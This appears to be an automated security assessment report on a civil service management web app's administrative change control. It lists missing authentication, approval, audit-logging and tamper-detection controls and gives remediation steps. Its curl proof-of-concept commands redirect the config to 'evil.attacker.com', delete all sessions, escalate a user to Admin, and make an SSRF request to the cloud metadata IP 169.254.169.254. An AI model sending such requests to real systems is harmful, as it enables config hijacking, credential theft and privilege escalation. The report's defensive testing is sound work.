# Requirement 28: Administrative Change Control

**Application:** CSMS (Civil Service Management System)
**URL:** http://localhost:9002
**Branch:** feat/err01-batch3-wrap-handler
**Test Date:** 2026-07-03
**Tester:** Automated Security Assessment

---

## Executive Summary

The CSMS application has **critical gaps** in administrative change control. Three admin API endpoints (`/api/admin/hrims-settings`, `/api/admin/cleanup-sessions`, `/api/admin/trigger-password-check`) and two user management endpoints (`/api/users/[id]` PUT and DELETE) lack any server-side authentication or authorization enforcement. This allows unauthenticated attackers to read sensitive credentials, modify system configuration, delete all user sessions, escalate privileges, and delete users.

**Overall Result: FAIL** -- Multiple critical findings across all five sub-cases.

---

## Test Accounts

| Account | Username | Role | Email | Auth Method |
|---------|----------|------|-------|-------------|
| HRMO | fautest | HRMO | None | Direct login (no MFA) |
| Employee | abdillahomarnajim | EMPLOYEE | None | Direct login (no MFA) |

---

## 28.1 Configuration Change Authorization

**Requirement:** Unauthorized configuration changes are blocked, authorized changes are allowed, and all changes are logged.

**Result: FAIL**

### Findings

#### 28.1-A: HRIMS Settings Endpoint Has No Authentication (CRITICAL)

The `/api/admin/hrims-settings` route handler uses only `wrapHandler()` -- it has no `withAuth()` wrapper. Any request, authenticated or not, can read and modify the HRIMS system configuration.

**Source:** `/home/latest/src/app/api/admin/hrims-settings/route.ts`

```typescript
// Line 13 - GET has no auth
export const GET = wrapHandler(async () => { ... }, 'admin-hrims-settings');

// Line 46 - PUT has no auth
export const PUT = wrapHandler(async (request: NextRequest) => { ... }, 'admin-hrims-settings');

// Line 108 - POST has no auth
export const POST = wrapHandler(async (request: NextRequest) => { ... }, 'admin-hrims-settings');
```

**Curl Evidence:**

```
# Non-admin HRMO changes HRIMS config -> 200 OK
$ curl -s -w "%{http_code}" -H "Cookie: session=$HRMO_SESSION" \
    -X PUT http://localhost:9002/api/admin/hrims-settings \
    -H 'Content-Type: application/json' \
    -d '{"host":"evil.attacker.com","port":"8080","apiKey":"stolen","token":"stolen"}'
200
{"success":true,"message":"HRIMS configuration updated successfully",...}

# Unauthenticated request changes HRIMS config -> 200 OK
$ curl -s -w "%{http_code}" \
    -X PUT http://localhost:9002/api/admin/hrims-settings \
    -H 'Content-Type: application/json' \
    -d '{"host":"evil.attacker.com","port":"8080"}'
200
{"success":true,"message":"HRIMS configuration updated successfully",...}

# Unauthenticated GET leaks full API keys -> 200 OK
$ curl -s http://localhost:9002/api/admin/hrims-settings
{"success":true,"data":{...,"_fullApiKey":"stolen-key","_fullToken":"stolen-token"}}
```

**Impact:** An attacker can redirect the HRIMS integration to a malicious server, steal API keys and tokens, or disrupt HR data synchronization.

#### 28.1-B: Session Cleanup Endpoint Has No Authentication (CRITICAL)

The `/api/admin/cleanup-sessions` route handler has no `withAuth()` wrapper. The `POST` handler accepts a `cleanup-all` action that deletes ALL active user sessions, effectively logging out every user in the system.

**Source:** `/home/latest/src/app/api/admin/cleanup-sessions/route.ts`

```typescript
// Line 10 - GET has no auth
export const GET = wrapHandler(async () => { ... }, 'admin-cleanup-sessions');

// Line 56 - POST has no auth (can delete ALL sessions)
export const POST = wrapHandler(async (req: Request) => { ... }, 'admin-cleanup-sessions');
```

**Curl Evidence:**

```
# Unauthenticated request deletes all sessions -> 200 OK
$ curl -s -X POST http://localhost:9002/api/admin/cleanup-sessions \
    -H 'Content-Type: application/json' \
    -d '{"action":"cleanup-all"}'
{"success":true,"message":"Deleted all 3 sessions","count":3}

# Unauthenticated request lists all sessions -> 200 OK
$ curl -s -X POST http://localhost:9002/api/admin/cleanup-sessions \
    -H 'Content-Type: application/json' \
    -d '{"action":"list-sessions"}'
{"success":true,"totalSessions":4,"sessionsByUser":{...}}
```

**Impact:** An attacker can forcibly log out all users (denial of service), enumerate all active sessions (information disclosure), or delete sessions for specific users.

#### 28.1-C: Users Endpoint Lacks Authorization (CRITICAL)

The `/api/users/[id]` PUT and DELETE handlers have no `withAuth()` wrapper. Any authenticated user (regardless of role) can update or delete any user account, including changing roles.

**Source:** `/home/latest/src/app/api/users/[id]/route.ts`

```typescript
// Line 29 - PUT has no withAuth, only wrapHandler
export const PUT = wrapHandler(async (req, { params }) => { ... }, 'users-put');

// Line 122 - DELETE has no withAuth, only wrapHandler
export const DELETE = wrapHandler(async (req, { params }) => { ... }, 'users-delete');
```

**Curl Evidence:**

```
# HRMO user changes own role to Admin -> 200 OK
$ curl -s -w "%{http_code}" -H "Cookie: session=$HRMO_SESSION" \
    -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
    -H 'Content-Type: application/json' \
    -d '{"role":"Admin"}'
200
{"id":"cme57cciu00082bcqnbw9sjm9",...,"role":"Admin",...}
```

**Impact:** Privilege escalation. Any authenticated user can grant themselves Admin role, then access all admin functions.

#### 28.1-D: Endpoints With Proper Auth Enforcement (PASS)

The following admin endpoints correctly enforce `withAuth({ allowedRoles: ['Admin'] })`:

| Endpoint | Auth Chain | Result |
|----------|-----------|--------|
| `/api/admin/reset-password` | `wrapHandler(withRateLimit(withAuth(handler, {allowedRoles: ['Admin']}), 'write'), ...)` | Non-admin gets 403 |
| `/api/admin/lock-account` | `wrapHandler(withRateLimit(withAuth(handler, {allowedRoles: ['Admin']}), 'write'), ...)` | Non-admin gets 403 |
| `/api/admin/unlock-account` | `wrapHandler(withRateLimit(withAuth(handler, {allowedRoles: ['Admin']}), 'write'), ...)` | Non-admin gets 403 |

**Curl Evidence:**

```
# HRMO POST to reset-password -> 403 Forbidden
$ curl -s -w "%{http_code}" -H "Cookie: session=$HRMO_SESSION" \
    -X POST http://localhost:9002/api/admin/reset-password \
    -H 'Content-Type: application/json' -d '{"userId":"fake"}'
403
{"success":false,"error":"Insufficient permissions","errorCode":"FORBIDDEN"}

# Unauthenticated POST to reset-password -> 401 Unauthorized
$ curl -s -w "%{http_code}" \
    -X POST http://localhost:9002/api/admin/reset-password \
    -H 'Content-Type: application/json' -d '{"userId":"fake"}'
401
{"success":false,"error":"Authentication required","errorCode":"UNAUTHENTICATED"}
```

---

## 28.2 Change Approval Workflow

**Requirement:** Critical configuration changes require approval before being applied.

**Result: FAIL**

### Findings

#### 28.2-A: No Approval Workflow for System Configuration

The HRIMS settings PUT handler applies changes immediately to the database with no approval step, no review queue, and no pending state.

**Source:** `/home/latest/src/app/api/admin/hrims-settings/route.ts` (lines 87-92)

```typescript
// Changes applied immediately -- no approval gate
await saveHrimsConfig({
  host,
  port: String(portNumber),
  apiKey: apiKey || undefined,
  token: token || undefined,
});
```

**Curl Evidence:**

```
# Config change applied immediately -> 200 OK
$ curl -s -X PUT http://localhost:9002/api/admin/hrims-settings \
    -H 'Content-Type: application/json' \
    -d '{"host":"10.0.217.11","port":"9090"}'
{"success":true,"message":"HRIMS configuration updated successfully",...}
```

#### 28.2-B: No Approval Workflow for User/Institution Changes

User updates (`/api/users/[id]` PUT) and institution updates (`/api/institutions/[id]` PUT) are applied immediately with no approval workflow.

**Source:**
- `/home/latest/src/app/api/users/[id]/route.ts` -- Direct `db.user.update()` call
- `/home/latest/src/app/api/institutions/[id]/route.ts` -- Direct `db.institution.update()` call

**Contrast:** HR request types (promotions, confirmations, LWOP, etc.) DO implement multi-stage approval workflows with `status`, `reviewStage`, `reviewedById`, `hrrpReviewedById` fields. System configuration changes have no equivalent protection.

#### 28.2-C: Approval Workflow Exists for HR Requests (PASS)

The following request types have proper multi-stage approval workflows:

| Request Type | Workflow Stages |
|-------------|----------------|
| Promotions | HRO submit -> HRRP review -> Commission approve |
| Confirmations | HRO submit -> HRRP review -> Commission approve |
| LWOP | HRO submit -> HRRP review -> Commission approve |
| Retirement | HRO submit -> HRRP review -> Commission approve |
| Resignation | HRO submit -> HRRP review -> Commission approve |
| Service Extension | HRO submit -> HRRP review -> Commission approve |
| Termination | HRO submit -> HRRP review -> Commission approve |
| Cadre Change | HRO submit -> HRRP review -> Commission approve |

---

## 28.3 Configuration Audit Logging

**Requirement:** All configuration changes are logged with previous and new values.

**Result: FAIL**

### Findings

#### 28.3-A: HRIMS Config Changes Are Not Audit-Logged (CRITICAL)

The HRIMS settings PUT handler does not call any audit logging function. Config changes are silently written to the `SystemSettings` table with no audit trail.

**Source:** `/home/latest/src/app/api/admin/hrims-settings/route.ts`

The entire file contains no imports or calls to `logAuditEvent`, `logInstitutionAction`, `logUserAction`, or any other audit function.

**Database Evidence:**

```
# Zero audit entries for HRIMS config changes
$ psql -c "SELECT COUNT(*) FROM audit.audit_log WHERE request_route LIKE '%hrims%';"
 0
```

#### 28.3-B: User Updates Lack Previous/New Value Logging

The user update audit log records only `targetUserId`, `targetUsername`, and `action`. It does not record which fields were changed, their previous values, or their new values.

**Source:** `/home/latest/src/app/api/users/[id]/route.ts` (lines 96-105)

```typescript
await logUserAction({
  action: 'UPDATED',
  targetUserId: updatedUser.id,
  targetUsername: updatedUser.username,
  performedById: actor?.userId || 'system',
  performedByUsername: actor?.username || 'system',
  performedByRole: actor?.role || 'ADMIN',
  // No previous values, no changed fields
});
```

**Database Evidence:**

```
# Audit entry for role escalation has no role change details
$ psql -c "SELECT additional_data FROM audit.audit_log WHERE action='USER_UPDATED' ORDER BY created_at DESC LIMIT 1;"
 {"action": "UPDATED", "targetUserId": "cme57cciu00082bcqnbw9sjm9", "targetUsername": "fautest"}
 # No indication that role was changed from HRMO to Admin
```

#### 28.3-C: Institution Updates Lack Previous/New Value Logging

The institution update audit log records only `institutionId`, `institutionName`, and `action`. No field-level change tracking.

**Source:** `/home/latest/src/app/api/institutions/[id]/route.ts` (lines 122-131)

---

## 28.4 Change Tracking

**Requirement:** All changes are tracked with complete history.

**Result: FAIL**

### Findings

#### 28.4-A: SystemSettings Model Has No Version History

The `SystemSettings` Prisma model stores only the current value. There is no history table, no versioning, and no change log. Previous values are overwritten and permanently lost.

**Source:** `/home/latest/prisma/schema.prisma` (lines 464-472)

```prisma
model SystemSettings {
  id        String   @id
  key       String   @unique
  value     String
  createdAt DateTime @default(now())
  updatedAt DateTime
  @@index([key])
}
```

**Database Evidence:**

```
# Current HRIMS config - no history of previous values
$ psql -c "SELECT key, value, \"updatedAt\" FROM \"SystemSettings\" WHERE key LIKE 'hrims%';"
 hrims_host     | 10.0.217.11           | 2026-07-03 19:38:07
 hrims_port     | 8080                  | 2026-07-03 19:38:07
 hrims_api_key  | <redacted>            | 2026-07-03 19:38:07
 hrims_token    | <redacted>            | 2026-07-03 19:38:07
```

#### 28.4-B: No ConfigurationHistory Model Exists

A search of the Prisma schema and entire codebase reveals no `ConfigurationHistory`, `SettingsHistory`, `ChangeLog`, or equivalent model that tracks configuration changes over time.

#### 28.4-C: Audit Log Does Not Track Config Route

The audit log query for HRIMS settings route returns zero entries, confirming that configuration changes bypass the audit system entirely.

```
$ psql -c "SELECT COUNT(*) FROM audit.audit_log WHERE request_route LIKE '%hrims%';"
 0
```

---

## 28.5 Configuration Integrity Validation

**Requirement:** Configuration integrity is preserved and tampering is detected.

**Result: FAIL**

### Findings

#### 28.5-A: Input Validation Exists (PARTIAL PASS)

The HRIMS settings PUT handler validates host format and port range:

```
# Invalid host rejected -> 400
$ curl -s -X PUT http://localhost:9002/api/admin/hrims-settings \
    -H 'Content-Type: application/json' \
    -d '{"host":"not valid!@#","port":"8080"}'
{"success":false,"message":"Invalid host format. Use IP address (e.g., 10.0.217.11) or hostname"}

# Invalid port rejected -> 400
$ curl -s -X PUT http://localhost:9002/api/admin/hrims-settings \
    -H 'Content-Type: application/json' \
    -d '{"host":"10.0.217.11","port":"99999"}'
{"success":false,"message":"Port must be a valid number between 1 and 65535"}

# Missing required fields rejected -> 400
$ curl -s -X PUT http://localhost:9002/api/admin/hrims-settings \
    -H 'Content-Type: application/json' -d '{}'
{"success":false,"message":"Host and port are required"}
```

#### 28.5-B: SSRF via Host Field (HIGH)

The host validation accepts cloud metadata IPs (e.g., `169.254.169.254`) and the POST handler makes an HTTP request to the attacker-controlled host, enabling Server-Side Request Forgery.

```
# SSRF to cloud metadata endpoint -> 200 OK (config accepted)
$ curl -s -X PUT http://localhost:9002/api/admin/hrims-settings \
    -H 'Content-Type: application/json' \
    -d '{"host":"169.254.169.254","port":"80","apiKey":"test","token":"test"}'
{"success":true,"message":"HRIMS configuration updated successfully",...}

# POST triggers HTTP request to attacker-controlled host
$ curl -s -X POST http://localhost:9002/api/admin/hrims-settings \
    -H 'Content-Type: application/json' \
    -d '{"host":"169.254.169.254","port":"80","apiKey":"test","token":"test"}'
{"success":false,"message":"Connection failed: fetch failed",
 "data":{"responseTime":10487,"testedUrl":"http://169.254.169.254:80/api"}}
```

**Source:** `/home/latest/src/lib/hrims-config.ts` -- `testHrimsConnection()` makes a live HTTP request to the provided host.

#### 28.5-C: No Tamper Detection Mechanism

The `saveHrimsConfig()` function performs a simple upsert to the `SystemSettings` table. There are no checksums, digital signatures, integrity verification, or comparison against a known-good baseline.

**Source:** `/home/latest/src/lib/hrims-config.ts`

#### 28.5-D: Role Escalation via Users Endpoint (CRITICAL)

The `/api/users/[id]` PUT handler accepts a `role` field and applies it without validation. An HRMO user successfully escalated to Admin role.

```
# HRMO escalates to Admin -> 200 OK
$ curl -s -H "Cookie: session=$HRMO_SESSION" \
    -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
    -H 'Content-Type: application/json' \
    -d '{"role":"Admin"}'
{"id":"cme57cciu00082bcqnbw9sjm9",...,"role":"Admin",...}
```

---

## Summary of Findings

| Test Case | Result | Severity | Description |
|-----------|--------|----------|-------------|
| 28.1-A | FAIL | CRITICAL | HRIMS settings endpoint has no authentication |
| 28.1-B | FAIL | CRITICAL | Session cleanup endpoint has no authentication |
| 28.1-C | FAIL | CRITICAL | Users PUT/DELETE endpoints have no authorization |
| 28.1-D | PASS | -- | reset-password, lock/unlock-account enforce Admin role |
| 28.2-A | FAIL | HIGH | HRIMS config changes require no approval |
| 28.2-B | FAIL | HIGH | User/institution changes require no approval |
| 28.2-C | PASS | -- | HR request types have multi-stage approval |
| 28.3-A | FAIL | CRITICAL | HRIMS config changes are not audit-logged |
| 28.3-B | FAIL | MEDIUM | User updates lack previous/new value logging |
| 28.3-C | FAIL | MEDIUM | Institution updates lack previous/new value logging |
| 28.4-A | FAIL | HIGH | SystemSettings has no version history |
| 28.4-B | FAIL | HIGH | No configuration history model exists |
| 28.4-C | FAIL | HIGH | Config changes bypass audit system entirely |
| 28.5-A | PASS | -- | Input validation for host format and port range |
| 28.5-B | FAIL | HIGH | SSRF via host field (cloud metadata IPs accepted) |
| 28.5-C | FAIL | MEDIUM | No tamper detection or integrity verification |
| 28.5-D | FAIL | CRITICAL | Role escalation via unauthenticated user update |

---

## Recommendations

### Immediate (P0)

1. **Add `withAuth()` to HRIMS settings endpoint** -- Wrap all three handlers (GET, PUT, POST) with `withAuth({ allowedRoles: ['Admin'] })`.
2. **Add `withAuth()` to cleanup-sessions endpoint** -- Wrap both handlers with `withAuth({ allowedRoles: ['Admin'] })`.
3. **Add `withAuth()` to users/[id] endpoint** -- Wrap PUT and DELETE with `withAuth({ allowedRoles: ['Admin'] })`. Remove the `role` field from the update schema for non-admin callers.
4. **Add `withAuth()` to institutions/[id] endpoint** -- Wrap PUT and DELETE with `withAuth({ allowedRoles: ['Admin'] })`.
5. **Revert any role escalations** -- Audit all users for unauthorized role changes.

### Short-term (P1)

6. **Add audit logging to HRIMS settings endpoint** -- Call `logAuditEvent()` on GET, PUT, and POST with full context (previous values, new values, who made the change).
7. **Add field-level change tracking** -- Modify `logUserAction()` and `logInstitutionAction()` to include `previousValues` and `newValues` in `additionalData`.
8. **Block SSRF vectors** -- Reject private/link-local IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x) in the host validation regex.
9. **Add approval workflow for config changes** -- Implement a pending/approved state for HRIMS config changes, similar to HR request workflows.

### Medium-term (P2)

10. **Create SystemSettingsHistory model** -- Track all changes to SystemSettings with previous value, new value, changedBy, and timestamp.
11. **Add integrity verification** -- Compute checksums of critical configuration values and verify on read.
12. **Consolidate auth enforcement** -- Audit all API routes for missing `withAuth()` wrappers. Consider making auth the default with an opt-out for public routes.

---

## Appendix: Key Source Files

| File | Relevance |
|------|-----------|
| `src/app/api/admin/hrims-settings/route.ts` | HRIMS config endpoint -- no auth |
| `src/app/api/admin/cleanup-sessions/route.ts` | Session cleanup -- no auth |
| `src/app/api/admin/reset-password/route.ts` | Password reset -- properly auth-protected |
| `src/app/api/admin/lock-account/route.ts` | Account lock -- properly auth-protected |
| `src/app/api/admin/unlock-account/route.ts` | Account unlock -- properly auth-protected |
| `src/app/api/users/[id]/route.ts` | User update/delete -- no auth |
| `src/app/api/institutions/[id]/route.ts` | Institution update -- no auth |
| `src/lib/api-auth.ts` | `verifyAuth()` and `withAuth()` implementation |
| `src/lib/audit-logger.ts` | Audit logging functions |
| `src/lib/hrims-config.ts` | HRIMS config storage and SSRF-prone test function |
| `prisma/schema.prisma` | SystemSettings model (no versioning) |
